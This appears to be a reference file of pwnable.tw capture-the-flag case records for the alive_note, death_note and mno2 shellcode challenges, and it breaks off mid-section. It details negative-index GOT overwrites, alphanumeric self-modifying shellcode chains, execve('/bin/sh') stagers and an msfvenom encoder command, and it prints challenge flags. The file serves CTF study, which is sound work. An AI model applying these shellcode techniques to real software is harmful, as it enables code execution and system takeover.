# pwnable.tw Shellcode and Sandbox Cases

Challenge-first case records for shellcode, alphanumeric encoding, ORW, and seccomp-filter targets. Generic vulnerable patterns live in [source-red-flags.md](source-red-flags.md).

## How To Use This File

Use this file when character-set shellcode, RWX execution, seccomp/BPF policy, ORW, architecture switching, or sandbox oracles dominate. If heap corruption is the prerequisite, read its allocator case first, then return here for the constrained execution finish.

## Case Index

| Challenge | Canonical route |
|---|---|
| [`alive_note`](#alive_note) | Negative-index note write → RWX-heap alphanumeric shellcode stored through `free@GOT` and invoked on delete |
| [`death_note`](#death_note) | Negative-index write plus `strdup` heap pointer in GOT → Printable/self-modifying shellcode execution and libc leak |
| [`mno2`](#mno2) | Formula-constrained executable input → Alphanumeric instruction construction and self-modification leading to `call eax` shellcode/execve |
| [`orw`](#orw) | Seccomp-filtered RWX shellcode execution → open/read/write shellcode; x64 `retf` architecture switch can enable `execve` |
| [`seccomptools`](#seccomptools) | `BPF_LD\|BPF_LEN` emulator/kernel differential plus `fread` FILE-pointer overflow → Seccomp oracle, fake FILE, setcontext ORW, mprotect shellcode, or two-stage FSOP |


## alive_note
> **Canonical route:** Negative-index note write → RWX-heap alphanumeric shellcode stored through `free@GOT` and invoked on delete
> **Read this case when:** Notes are limited to alphanumeric/space bytes and a negative index reaches GOT entries.
> **Primary defect:** Negative-index note write
> **Exploit primitive/result:** RWX-heap alphanumeric shellcode stored through `free@GOT` and invoked on delete
> **Search terms:** negative index; alphanumeric shellcode; `READ_IMPLIES_EXEC`; `free@GOT`; `popad`
> **Version/protection clue:** Case target `alive_note` — i386, glibc 2.23, Partial RELRO, canary, NX disabled, no PIE
> **Variant boundary:** Stricter successor of `death_note`; use the narrower alphanumeric/space filter.

### Metadata
- Source title: Alive Note — pwnable.tw (350 pts)

```yaml
tags:
  - heap-buffer-overflow
  - alpha-shellcode
  - got-overwrite
platform: pwnable.tw
points: 350
arch: i386
libc: glibc-2.23
relro: partial
canary: yes
nx: no
pie: no
references:
  - https://pwnable.tw/challenge/
description: "An out-of-bounds index write allows overwriting the free GOT entry to jump to a sequence of chained 3-byte alphanumeric shellcode fragments stored across heap note chunks."
proof-of-concept: no
```

# Alive Note — pwnable.tw (350 pts)

> The last 23 days, write down your shellcode.
>
> `nc chall.pwnable.tw 10300`
>
> Flag: `FLAG{Sh3llcoding_in_th3_n0t3_ch4in}`

### Facts

#### Challenge Overview

A 32-bit i386 note-taking binary (No PIE, Partial RELRO, Stack Canary, **NX disabled / RWX heap**). The player can add, show, and delete "names" stored in a notes array. Each name is `strdup()`'d to the heap (max 8 bytes), and its content is validated to be **alphanumeric + space only**. An upgrade from the "Death Note" challenge — same GOT overwrite via negative index, but with a much stricter character set.

```
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO        # GOT writable
  Stack:    Canary found
  NX:       NX unknown           # GNU_STACK missing
  PIE:      No PIE (0x8048000)
  RWX:      Has RWX segments     # READ_IMPLIES_EXEC → heap is executable
```

The `GNU_STACK` program header is set to RWE. On i386 Linux, this enables the `READ_IMPLIES_EXEC` personality flag, making **all readable pages (including heap) executable**. This is the fundamental enabler for running shellcode from heap-allocated notes.

#### Vulnerabilities

##### V1 — Negative Index OOB Write/Read (Primary, Exploitable)

**Root Cause:** The index bounds check only validates the **upper bound** (`idx > 10`), allowing negative indices to access memory before the `notes[]` array.

```c
// Simplified add_note / del_note
read_int();  // reads index via atoi()
if (idx > 10) { puts("Out of bound !!"); exit(0); }
notes[idx] = strdup(name_buf);  // negative idx → write before notes[]
// or
free(notes[idx]);               // negative idx → free arbitrary GOT entry's value
```

**Key offsets:**

```
notes[]   @ 0x0804a080   (11 slots, index 0..10)
free@GOT  @ 0x0804a014
atoi@GOT  @ 0x0804a034
```

```
index_free = (0x0804a014 - 0x0804a080) / 4 = -27
index_atoi = (0x0804a034 - 0x0804a080) / 4 = -19
```

**Impact:**
- `add_note(-27, shellcode)` → `strdup()` allocates a heap chunk containing the shellcode, and the chunk's address is written into `free@GOT`.
- `delete_note(-27)` → calls `free(notes[-27])`, which resolves through `free@GOT` (now pointing to the heap chunk) → **jumps into the shellcode on the heap**.
- At entry, `eax` holds the pointer to the freed chunk (i.e., the shellcode base address), which is critical for self-modifying code.

##### V2 — Alphanumeric-Only Content Filter

**Root Cause:** `add_note` validates each byte of the name using `__ctype_b_loc()` with the `_ISalnum` (0x08) flag. Only bytes in `[0-9A-Za-z ]` (ASCII `0x20`, `0x30-0x39`, `0x41-0x5a`, `0x61-0x7a`) pass.

```c
// check() — per-byte validation
if (c == ' ') ok;
else if (__ctype_b_loc()[c] & 0x08) ok;  // _ISalnum
else return 0;  // "It must be a alnum name !!" → exit(-1)
```

**Impact:** Standard shellcode bytes like `\xcd\x80` (`int 0x80`), `\x2f` (`/` in `/bin/sh`), `\x0b` (`SYS_execve`) are forbidden. The shellcode must be constructed entirely from alphanumeric bytes, requiring self-modifying techniques.

##### V3 — 8-Byte Note Size Limit

Each `strdup()` copies at most 8 bytes (7 useful + NUL terminator). With the heap allocator's minimum chunk size of `0x10`, consecutive notes are spaced `0x10` bytes apart on the heap. The shellcode must be split into 6-byte fragments chained together with 2-byte jumps.

#### Key Data Structures

##### Heap Chunk Layout

Each note allocation via `strdup()` creates a `0x10`-byte chunk:

```
+0x00: prev_size (4 bytes)
+0x04: size = 0x11 (4 bytes, includes PREV_INUSE bit)
+0x08: user data (up to 8 bytes of alphanumeric shellcode)
```

Consecutive chunks are at `base + N*0x10`. The 8-byte chunk header between notes is **not executable code**, so jumps must skip over them.

##### Jump Chaining

Each 8-byte note holds ~6 bytes of useful shellcode + a 2-byte conditional jump to reach the next note:

```
[6 bytes shellcode] [jne/jno/jae +0x38]
```

Common jump opcodes used (all alphanumeric):
- `\x75\x38` — `jne +0x38` (opcode `u8`, jumps `0x3a` bytes forward = skip 3 chunk headers + 2 bytes to next note's code)
- `\x71\x38` — `jno +0x38`
- `\x73\x38` — `jae +0x38`
- `\x74\x39` — `je +0x39`

The jump condition (ZF=0 after `free` setup or prior XOR ops) ensures the conditional branch is always taken.

### Exploit Paths

#### Exploit Paths

All solutions exploit V1 (negative index GOT overwrite) combined with alphanumeric shellcode on the executable heap. They diverge on the shellcode construction strategy.

---

##### Path A — Self-Modifying Alphanumeric Shellcode Chain → `read()` Stager → `execve()` (Dominant)

**Used by:** ~90% of solutions (59, 278, 370, 550, 583, 644, 821, 1172, 1780, 2524, 3498, 5002, 7905, 8153, 14106, 17704, 25916, 36997, and exp.py)

**Strategy:** Write a chain of alphanumeric shellcode fragments across heap chunks, connected by conditional jumps. The chain self-modifies to patch `int 0x80` (`\xcd\x80`) into a downstream chunk, then executes `read(0, buf, N)` to pull in unrestricted stage-2 shellcode (`execve("/bin/sh", 0, 0)`).

**Steps:**

1. **Overwrite `free@GOT`:** `add_note(-27, stage1_chunk0)` — the `strdup`'d chunk address overwrites `free@GOT`.

2. **Place shellcode fragments:** `add_note(0..N, fragment)` — each fragment is 6 bytes of alphanumeric machine code + 2-byte jump. Spacer notes (3-4 dummy allocations) fill the gap between meaningful chunks.

3. **Trigger execution:** `delete_note(-27)` — calls `free(notes[-27])`, which jumps to chunk0 on the heap.

4. **Shellcode chain executes:**
   - Set `ecx` = chunk base (via `push eax; pop ecx` — `eax` = freed pointer)
   - Set `edx` = read count (e.g., `push 0x7a; pop edx`)
   - Patch `int 0x80`: use `xor byte ptr [ecx+offset], al` with computed values to transform alphanumeric bytes (e.g., `0x74 0x39`) into `\xcd\x80`
   - Set `eax` = 3 (`SYS_read`): via `push imm8; pop eax; xor al, imm8`
   - Execute patched `int 0x80` → `read(0, heap_base, 0x7a)`

5. **Send stage-2:** NOP sled (`\x90` or `\x41`=`inc ecx`) + raw `execve("/bin/sh", 0, 0)` shellcode. Read writes over the heap starting at the chain base; execution falls through the sled into the real shellcode.

**Example chain (from exp.py):**

```python
STAGE1 = [
    (-27, b"PYjzZSu8"),   # push eax; pop ecx; push 0x7a; pop edx; push ebx; jne
    (0,   b"4F0A5Su8"),   # xor al,0x46; xor [ecx+0x35],al; push ebx; jne
    (1,   b"fuck"),       # spacer (never executed)
    (2,   b"X4340t9"),    # pop eax; xor al,0x33; xor al,0x30; je (patched to int 0x80)
    (3,   b"XH0AFu6"),   # pop eax; dec eax; xor [ecx+0x46],al; jne
    (4,   b"0A60AWua"),   # xor [ecx+0x36],al; xor [ecx+0x57],al; jne
]
```

**Patching `int 0x80`:** The bytes `0x74 0x39` (at chunk2 offset +5,+6) are XORed in-place:
- `0x74 ^ 0xb9 = 0xCD` and `0x39 ^ 0xb9 = 0x80` → produces `\xcd\x80`
- The value `0xb9` is obtained via `xor al, 0x46` on `0xff` (from `dec eax` on 0)

**Stage 2:** `b"A" * 0x37 + execve_shellcode` — the `A` bytes (`0x41` = `inc ecx`) serve as a NOP sled, landing execution precisely at the `execve` payload.

---

##### Path B — `popad` Frame Construction → `int 0x80` via Memory XOR

**Used by:** Solutions 278, 5002, 3498

**Variant** of Path A that uses `popad` (`0x61`, alphanumeric!) to bulk-load registers from a carefully constructed stack frame:

1. Push register values onto the stack in the correct order for `popad` (EDI, ESI, EBP, ESP, EBX, EDX, ECX, EAX).
2. Use `xor [reg+offset], ax/eax` to patch `int 0x80` into memory.
3. Execute `popad` to set all registers at once, then fall through to patched `int 0x80`.

This approach is more complex but avoids individual register setup.

---

##### Path C — Leak libc via `show_note` + System Call via GOT Overwrite

**Used by:** Solutions 100, 956

**Strategy:** Instead of building a `read()` stager, leak libc addresses and call `system()` directly.

1. **Leak libc:** `show_note(-N)` reads memory before `notes[]`, hitting GOT entries or other libc pointers. Parse the leaked bytes to compute libc base.

2. **Overwrite `free@GOT`** with heap shellcode that swaps registers and jumps to `system()`.

3. **Trigger with crafted input:** `delete_note` passes `system()` address + `"sh"` string through `atoi`/`read_int` tricks, or the alphanumeric shellcode on heap sets up `call [eax]` with `eax = system`.

**Downside:** More fragile — relies on specific libc offsets and register state at call time.

---

##### Path D — `strlen@GOT` Overwrite to Bypass Alphanumeric Check

**Used by:** Solution 3148

**Strategy:** Instead of writing alphanumeric shellcode, neutralize the character filter by overwriting `strlen@GOT`.

1. **Exhaust heap** with many dummy `strdup` allocations until the wilderness chunk's size field contains useful byte sequences (e.g., `\xc3\x41` = `ret; inc ecx`).

2. **Overwrite `strlen@GOT`** (index -22) to point to a heap address containing `ret` — making `strlen()` always return quickly without actually validating the string.

3. **With the filter bypassed**, write arbitrary (non-alphanumeric) shellcode bytes to heap notes.

4. **Overwrite `free@GOT`** or `atoi@GOT` with shellcode address, trigger execution.

**Downside:** Requires precise heap grooming (thousands of allocations to get the right top-chunk size).

---

##### Path E — Direct `execve` via `popad` + `xor` patching (No Read Stager)

**Used by:** Solutions 5002, 25916

**Strategy:** Build the entire `execve("/bin/sh", 0, 0)` syscall using only alphanumeric shellcode, without a `read()` stager. Uses `xor` to patch `/bin/sh` string and `int 0x80` into memory, then `popad` to load all registers:

1. Construct `/bin/sh\x00` string byte-by-byte via `push` + `xor`.
2. Construct `\xcd\x80` via XOR patching.
3. Set `eax=0xb`, `ebx=ptr_to_binsh`, `ecx=0`, `edx=0`.
4. Execute patched `int 0x80`.

**Downside:** Requires many more shellcode chunks (15-50+), much more complex chain.

#### Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| GOT overwrite (`free`, `atoi`, `strlen`) | V1: Negative index OOB | Deterministic |
| Heap code execution | RWX heap (READ_IMPLIES_EXEC) | Deterministic (i386 only) |
| Self-modifying shellcode | XOR patching `int 0x80` | Deterministic |
| `read()` stager (stage 1) | Alphanumeric chain → `read(0, buf, N)` | Deterministic |
| `execve("/bin/sh")` (stage 2) | Unrestricted shellcode via `read()` | Deterministic |
| libc leak | `show_note` with negative index | Deterministic |

#### Alphanumeric Instruction Reference

Key x86 instructions that have alphanumeric encodings:

| Instruction | Bytes | ASCII |
|------------|-------|-------|
| `push eax` | `50` | `P` |
| `push ecx` | `51` | `Q` |
| `push edx` | `52` | `R` |
| `push ebx` | `53` | `S` |
| `push esp` | `54` | `T` |
| `push ebp` | `55` | `U` |
| `pop eax` | `58` | `X` |
| `pop ecx` | `59` | `Y` |
| `pop edx` | `5a` | `Z` |
| `push imm8` | `6a xx` | `j` + alnum |
| `inc ecx` | `41` | `A` |
| `inc edx` | `42` | `B` |
| `inc ebx` | `43` | `C` |
| `dec eax` | `48` | `H` |
| `dec ebx` | `4b` | `K` |
| `xor al, imm8` | `34 xx` | `4` + alnum |
| `xor [ecx+off], al` | `30 41 xx` | `0A` + alnum |
| `xor ax, imm16` | `66 35 xx xx` | `f5` + alnum |
| `jne rel8` | `75 xx` | `u` + alnum |
| `jno rel8` | `71 xx` | `q` + alnum |
| `jae rel8` | `73 xx` | `s` + alnum |
| `popad` | `61` | `a` |

### Assets and Provenance

#### Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `59.md` | A | `jno` chain, XOR self-modify, NASM annotated | Includes full assembly source |
| `100.md` | C | libc leak via show, system() via register swap | No read stager — direct system call |
| `185.md` | A | `popad` + `xor word [edx+eax*2+0x38],cx` | Uses computed addressing mode |
| `278.md` | B | `popad` frame + XOR patch int 0x80 | Ruby exploit |
| `370.md` | A | Minimal — "same as Death Note, just jumping" | 2 lines of explanation |
| `550.md` | A | `popad` based, elaborate register chain | Uses negative indices for spacers |
| `583.md` | A | XOR `[ecx+off]` to patch `int 0x80` | Clean Python exploit |
| `644.md` | A | 7 stage chain, `jae` jumps | Well-documented stages |
| `821.md` | A | `xor [ecx+0x31]` patching, `jne` | Assembly + exploit script |
| `956.md` | C | `atoi@GOT` overwrite, libc leak, execve | Heap exhaustion approach |
| `1172.md` | A | `PYjAXGq8` chain, 5 notes | Minimal chain |
| `1780.md` | A | `jno 0x40` jumps, `xor byte` patches | Clean separation of stages |
| `2524.md` | A | `jae` jumps, 9 stages | Incremental `inc edx` for syscall nr |
| `3148.md` | D | `strlen@GOT` bypass, heap exhaustion | Bypasses alnum check entirely |
| `3498.md` | A | Enumerated valid bytes, `popad` + XOR | Most thorough valid-byte analysis |
| `5002.md` | E | Full `popad` frame, no read stager | Constructs `int 0x80` + `/bin/sh` in-place |
| `7905.md` | A | Detailed writeup with Unicorn verification | Best-documented solution |
| `8153.md` | A | Chinese writeup, XOR patching explained | Step-by-step register/memory trace |
| `14106.md` | A | Minimal `jne 0x48` chain | Concise strategy description |
| `17704.md` | A | `jno 0x39` chain, 9 fragments | Uses `dec edx; push edx; pop eax` |
| `25916.md` | A | `jno` chain, many XOR patches | Extended chain with separate XOR stages |
| `36997.md` | A | `jne` chain, `pop ecx` stager | References external writeup for learning |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (self-contained, no pwntools dependency) |
| `desc.txt` | Challenge description |
| `artifacts/alive_note` | Original challenge binary (i386, not stripped) |
| `solution/*.md` | Community write-ups (87 solutions) |

## death_note
> **Canonical route:** Negative-index write plus `strdup` heap pointer in GOT → Printable/self-modifying shellcode execution and libc leak
> **Read this case when:** Printable notes are stored on the heap, a negative index reaches GOT, and delete executes a stored pointer.
> **Primary defect:** Negative-index write plus `strdup` heap pointer in GOT
> **Exploit primitive/result:** Printable/self-modifying shellcode execution and libc leak
> **Search terms:** printable shellcode; negative index; `strdup`; `free@GOT`; XOR/SUB encoder
> **Version/protection clue:** Case target `death_note` — i386, static, Partial RELRO, canary, nominal NX but executable heap, no PIE
> **Variant boundary:** Predecessor of `alive_note`; Alive Note has the stricter alphanumeric/space filter.

### Metadata
- Source title: Death Note — pwnable.tw (300 pts)

```yaml
tags:
  - out-of-bounds-write
  - alpha-shellcode
  - got-overwrite
platform: pwnable.tw
points: 300
arch: i386
libc: static
relro: partial
canary: yes
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "A negative index in note selection allows writing an address into the GOT array, redirecting execution to printable alphanumeric shellcode stored on an executable heap."
proof-of-concept: no
```

# Death Note — pwnable.tw (300 pts)

> `nc chall.pwnable.tw 10201`
>
> "Write the shellcode on your Death Note."

### Facts

#### Challenge Overview

A simple note management binary (i386, no PIE, Partial RELRO, **NX nominally enabled but heap is executable** due to missing `PT_GNU_STACK` header → `READ_IMPLIES_EXEC` on the old remote kernel). The program lets the user add, show, and delete notes stored in a global array. Input content is filtered to only allow **printable ASCII** bytes (0x20–0x7e).

```
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO        # GOT writable
  Stack:    Canary found
  NX:       NX enabled           # but heap is executable (READ_IMPLIES_EXEC)
  PIE:      No PIE
```

Binary is **not stripped**, named functions visible: `add_note`, `show_note`, `del_note`, `read_input`, `read_int`, `is_printable`, `menu`, `main`.

#### Binary Reconstructed Logic

```c
// Global note array at 0x804a060
char *note[11];  // note[0]..note[10]

void add_note() {
    char buf[0x50];
    printf("Index :");
    int idx = read_int();
    if (idx > 10) { puts("Out of bound!!"); exit(0); }  // BUG: no lower bound check
    printf("Name :");
    read_input(buf, 0x50);
    if (!is_printable(buf)) { puts("It must be printable"); exit(-1); }
    note[idx] = strdup(buf);    // heap alloc, stores pointer at note[idx]
    puts("Done !");
}

void show_note() {
    printf("Index :");
    int idx = read_int();
    if (idx > 10) { puts("Out of bound!!"); exit(0); }  // BUG: no lower bound check
    if (note[idx])
        printf("Name : %s\n", note[idx]);
}

void del_note() {
    printf("Index :");
    int idx = read_int();
    if (idx > 10) { puts("Out of bound!!"); exit(0); }  // BUG: no lower bound check
    free(note[idx]);            // calls free@plt → jmp *free@got
    note[idx] = 0;
}

int is_printable(char *s) {
    for (int i = 0; i < strlen(s); i++)
        if (s[i] <= 0x1f || s[i] == 0x7f) return 0;
    return 1;
}
```

#### Vulnerabilities

##### V1 — Negative Index OOB Write/Read (Primary, Exploitable)

**Root Cause:** `add_note`, `show_note`, and `del_note` all check `if (idx > 10) exit(0)` but **never check `idx < 0`**. Since `idx` is a signed `int` and the array access is `note[idx]` (i.e., `*(note_base + idx*4)`), a negative index accesses memory **below** the `note` array — straight onto the GOT.

```asm
; add_note — the critical store
movl %edx, 0x804a060(,%eax,4)   ; note[idx] = strdup(buf)
; when idx = -19:  0x804a060 + (-19)*4 = 0x804a014 = free@got
```

**Key GOT Addresses vs. `note` base (0x804a060):**

| GOT Entry | Address | Index |
|-----------|---------|-------|
| `read@got` | `0x804a00c` | -21 |
| `printf@got` | `0x804a010` | -20 |
| `free@got` | `0x804a014` | **-19** |
| `strdup@got` | `0x804a018` | -18 |
| `__stack_chk_fail@got` | `0x804a01c` | -17 |
| `puts@got` | `0x804a020` | **-16** |
| `exit@got` | `0x804a024` | -15 |
| `strlen@got` | `0x804a028` | -14 |

**Impact:** Writing at a negative index overwrites a GOT entry with the heap pointer returned by `strdup()`. Since the heap is executable, the GOT entry now points to attacker-controlled shellcode on the heap.

##### V2 — Negative Index OOB Read (Leak)

Using `show_note` with a negative index reads `note[idx]` from before the array — which includes the GOT. Since GOT entries contain resolved libc function pointers after first call, this leaks libc addresses.

```c
// show_note with idx = -21 reads note[-21] = read@got → leaks &read in libc
```

**Impact:** Leak libc base for computing `system()` address (used by some exploit variants).

##### V3 — Printable-Only Filter Constraint

```c
int is_printable(char *s) {
    for (int i = 0; i < strlen(s); i++)
        if (s[i] <= 0x1f || s[i] == 0x7f) return 0;  // reject < 0x20 or == 0x7f
    return 1;
}
```

All shellcode bytes must be in range `[0x20, 0x7e]`. This means bytes like `\xcd\x80` (`int 0x80`), `\x31\xc0` (`xor eax,eax`), `\x89\xe3` (`mov ebx,esp`), and `\x0b` (`mov eax, 11`) are **forbidden**. Shellcode must be **printable/alphanumeric** or **self-modifying**.

#### Key Data Structures

##### Memory Layout (BSS)

```
0x804a000  GOT start
0x804a00c  read@got
0x804a010  printf@got
0x804a014  free@got          ← index -19
0x804a018  strdup@got        ← index -18
0x804a01c  __stack_chk_fail@got
0x804a020  puts@got          ← index -16
0x804a024  exit@got          ← index -15
0x804a028  strlen@got        ← index -14
...
0x804a060  note[0]           ← base (index 0)
0x804a064  note[1]
...
0x804a088  note[10]
```

### Exploit Paths

#### Exploit Paths

All solutions exploit V1 (negative index GOT overwrite). They differ in which GOT entry to overwrite, shellcode encoding strategy, and whether they need a leak.

---

##### Path A — Overwrite `free@got` → Printable Shellcode (Most Common)

**Used by:** Solutions 184, 1236, 1303, 1351, 1395, 1715, 1780, 1803, 1852, 1922, 2121, 14032, 21260, 22696, exp.py

**Steps:**

1. **`add_note(-19, shellcode)`**: `strdup(shellcode)` copies the printable shellcode to a heap chunk `H` and writes `H` into `note[-19]` = `free@got`.

2. **`del_note(-19)`**: Calls `free(note[-19])` → `free@plt` → `jmp *free@got` = `jmp H`. The argument to `free()` is `H` itself, so **EAX = H** (the shellcode's own address on the heap), giving the shellcode a base register.

3. The shellcode uses self-modifying code to produce `int 0x80` (`\xcd\x80`) at runtime, since those bytes aren't printable.

**Shellcode Strategies for Printable `execve("/bin//sh")`:**

- **Self-patching XOR:** Use `push eax; pop esi` to get shellcode base address, then `xor word [esi+offset], cx` where `cx` is crafted so the XOR of a printable placeholder yields `\xcd\x80`. Example from exp.py:
  ```asm
  push eax ; pop esi          ; esi = shellcode base (H)
  ; ... build cx = 0xc18c via printable sub chain ...
  xor word [esi+0x4b], cx     ; patches placeholder 0x4141 → 0x80cd = int 0x80
  ```

- **Self-patching SUB:** Use `sub byte [eax+offset], dl` with printable `dl` values to subtract down to `\xcd` and `\x80`.

- **Stack pivot + push:** Pivot `esp` to the heap (since EAX = heap addr), push the `int 0x80` opcode bytes onto the heap via arithmetic, then execute them in-line.

- **`inc eax` × 11:** Build `eax = 0xb` (execve syscall) using 11 `inc eax` instructions (opcode `\x40`, printable).

**Register Setup for `execve`:**
```asm
; eax = 0xb (via inc eax * 11, or push 0x3b; pop eax; xor al, 0x30)
; ebx → "/bin//sh" (push 0x68732f2f; push 0x6e69622f; push esp; pop ebx)
; ecx = 0 (push edx; pop ecx, or inherited from caller)
; edx = 0 (inherited or push ecx; pop edx)
; int 0x80 (self-patched at runtime)
```

**Reliability:** 100% — no ASLR/randomness involved. Fixed addresses, deterministic.

---

##### Path B — Overwrite `puts@got` → Shellcode

**Used by:** Solutions 184 (first script), 1251, 15134

**Steps:**

1. **`add_note(-16, shellcode)`**: Overwrites `puts@got` with heap shellcode pointer.

2. Any subsequent call to `puts()` (e.g., from menu printing or "Done!") jumps to shellcode.

**Variant — Two-stage shellcode:** Some solutions split the shellcode across two heap allocations (due to size constraints), with the first stage jumping to the second.

**Note:** The initial register state differs from Path A — EAX does not contain the shellcode address, so some solutions use different approaches (e.g., reading EAX from the stack via `pop` gadgets).

---

##### Path C — Overwrite `strlen@got` → ROP/Stage2

**Used by:** Solutions 2239, 1006

**Steps:**

1. **`add_note(-14, shellcode_stub)`**: Overwrites `strlen@got`. Since `is_printable()` calls `strlen()` on user input, the next `add_note` call triggers the overwritten `strlen@got` with the user's input buffer on the stack.

2. The stub patches itself or pivots the stack to perform a second-stage `read_input()` call that reads unrestricted shellcode (no printable filter) into a known writable/executable address.

3. Jump to the second-stage shellcode → `execve("/bin/sh")`.

**Advantage:** Bypasses the printable filter entirely for the real shellcode — only the stub needs to be printable.

---

##### Path D — Leak libc + Overwrite GOT → `system`

**Used by:** Solutions 1384, 1715 (variant)

**Steps:**

1. **Leak libc:** `show_note(-21)` reads `note[-21]` = `read@got` → prints resolved `read` address → compute libc base.

2. **Compute `system` address:** `libc_base + system_offset`.

3. **Check if `system` address is printable** (middle bytes). If not, retry or use a different approach.

4. **Overwrite `free@got` with printable shellcode** that patches the GOT entry of another function to `system`, then calls it with `"/bin/sh"` as argument.

**Variant — `__malloc_hook`:** Some solutions overwrite `__malloc_hook` via the negative index (requires computing the correct index from the BSS) and trigger `malloc` (via `strdup` in `add_note`).

---

##### Path E — Alphanumeric Encoder Stub

**Used by:** Solutions 1395 (msfvenom), 15134

**Steps:**

1. Use `msfvenom -e x86/alpha_mixed BufferRegister=EDX` or a hand-crafted alphanumeric decoder stub.

2. The stub decodes an in-line encoded payload at runtime, producing arbitrary shellcode bytes.

3. Jump to decoded shellcode → `execve("/bin/sh")`.

**Example (msfvenom):**
```
echo '\x83\xC4\x30\xC3' | msfvenom -a x86 --platform linux -p - -e x86/alpha_mixed BufferRegister=EDX
```

#### Shellcode Encoding Techniques Summary

| Technique | How `int 0x80` is Produced | Printable? | Size |
|-----------|---------------------------|------------|------|
| XOR self-patch | `xor word [esi+off], cx` where placeholder ⊕ cx = `\xcd\x80` | Yes | ~60-77 bytes |
| SUB self-patch | `sub byte [eax+off], dl` to decrement printable bytes down | Yes | ~50-70 bytes |
| Stack pivot + push | Pivot ESP to heap, push `\xcd\x80` as computed dword | Yes | ~60-80 bytes |
| `inc eax` × 11 | N/A for int 0x80; patches via XOR/SUB | Yes | ~40-60 bytes |
| msfvenom alpha_mixed | Full decoder stub | Alphanumeric | ~80+ bytes |
| Two-stage (read + jmp) | Second stage is unrestricted | Only stub | ~30 + unlimited |

#### Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| GOT overwrite (write) | V1: negative index in add_note | Deterministic |
| GOT read (leak) | V2: negative index in show_note | Deterministic |
| Heap code execution | Missing PT_GNU_STACK → READ_IMPLIES_EXEC | Deterministic on remote |
| Printable shellcode | Self-modifying / encoded | Deterministic |
| Shell | `execve("/bin/sh")` via int 0x80 | Deterministic |

### Assets and Provenance

#### Solution Write-ups

| File | Primary Path | GOT Target | Shellcode Technique | Notes |
|------|-------------|------------|---------------------|-------|
| `184.md` | A/B | puts@got (-16) | Alphanumeric, two-stage with jno jump | Two chunks, sc1→sc2 |
| `196.md` | Custom | N/A | Heap spray + printable stub | 222 brute-force allocs |
| `1006.md` | C | strlen@got (-14) | Stub + ROP to read_input for stage2 | Bypasses printable filter |
| `1236.md` | A | free@got (-19) | XOR self-patch + `inc eax`×11 | Compact, direct |
| `1251.md` | A | puts@got (-16) | Alphanumeric (pwntools asm) | Self-modifying xor+xor |
| `1303.md` | A | free@got (-19) | Stack pivot to heap, push int 0x80 | Clever stack migration |
| `1351.md` | A | free@got (-19) | Stack pivot + xor ax sequences | Uses `push edi; pop esp` |
| `1384.md` | D | __malloc_hook | libc leak via show + heap shellcode | Uses negative show for leak |
| `1395.md` | E | free@got (-19) | msfvenom alpha_mixed encoder | One-liner shellcode |
| `1715.md` | A | free@got (-19) | XOR self-patch, sub chain for eax=0xb | Clean modular approach |
| `1780.md` | A | free@got (-19) | XOR + sub byte, `jno` for conditional flow | Stores /bin/sh in note[0] |
| `1803.md` | A | free@got (-19) | AND+SUB chains for `int 0x80` bytes | Ruby solver |
| `1852.md` | A | free@got (-19) | Stack pivot via `pop esp` | Pushes `int 0x80` onto heap |
| `1922.md` | A | free@got (-19) | XOR `[ebx+off]` self-patch | Patches 2 bytes via `al=0x80` |
| `1980.md` | A | puts@got (-16) | SUB byte chain for cd/80 | Stores /bin/sh separately |
| `2121.md` | A | free@got (-19) | XOR + dec ecx chain for self-patch | Uses `esi+ecx*2` addressing |
| `2239.md` | C | strlen@got (-14) | Stub → leak heap → ROP → read stage2 | Most complex, two stages |
| `10128.md` | A | free@got (-19) | DEC+XOR byte self-patch | Stores /bin/sh in note[0] |
| `14032.md` | A | free@got (-19) | XOR self-patch using `[eax+off]` | Compact, `\x61\x61` = `int 0x80` patch |
| `15134.md` | E | puts@got (-16) | Alphanumeric decoder (`sub` + `xor`) | Encodes each forbidden byte |
| `21260.md` | A | free@got (-19) | SUB chain: `sub [esi+off], eax` | Dual sub for `cd80` word |
| `22696.md` | A | free@got (-19) | Stack pivot + XOR ax chain | Includes NASM source |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (printable self-patching execve shellcode) |
| `desc.txt` | Challenge description |
| `artifacts/death_note` | Original challenge binary (i386, not stripped) |
| `solution/*.md` | Community write-ups (141 solutions) |

## mno2
> **Canonical route:** Formula-constrained executable input → Alphanumeric instruction construction and self-modification leading to `call eax` shellcode/execve
> **Read this case when:** Executable input must simultaneously parse as an alphanumeric chemical formula.
> **Primary defect:** Formula-constrained executable input
> **Exploit primitive/result:** Alphanumeric instruction construction and self-modification leading to `call eax` shellcode/execve
> **Search terms:** MnO2; chemical formula; alphanumeric; periodic table; `call eax`; RWX mmap
> **Version/protection clue:** Case target `mno2` — i386, static, Partial RELRO, NX with fixed RWX mmap, no canary/PIE
> **Variant boundary:** Standalone; the parser and instruction set are both constraints.

### Metadata
- Source title: MnO2 — pwnable.tw (300 pts)

```yaml
tags:
  - alpha-shellcode
  - seccomp-bypass
platform: pwnable.tw
points: 300
arch: i386
libc: static
relro: partial
canary: no
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "Alphanumeric shellcode execution in a fixed RWX memory region under seccomp restrictions, using self-modifying code to craft syscall instructions."
proof-of-concept: no
```

# MnO2 — pwnable.tw (300 pts)

> `nc chall.pwnable.tw 10301`
>
> Flag: `FLAG{4(7|-||>4|_||\||>|>|_|4|\/|(|\/|b|<(|=35|=|\/||\/|d|\|0|_.-}`

### Facts

#### Challenge Overview

A 32-bit Linux binary that reads user input with `scanf("%s")` into a fixed RWX `mmap`'d region at `0x324F6E4D` ("MnO2" in little-endian ASCII). A validation function `check()` then verifies that the input is a **valid chemical formula** — every byte must be alphanumeric, and the string must tokenize as a sequence of real periodic-table element symbols (uppercase letter, optional lowercase, optional digits). If the check passes, the program does `call eax` where `eax` points to the buffer — executing the input as **shellcode**.

The core challenge: write **alphanumeric shellcode that is simultaneously a valid chemical formula**.

```
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO
  Stack:    No canary found
  NX:       NX enabled (but mmap region is RWX)
  PIE:      No PIE
```

##### Register State at `call eax`

```
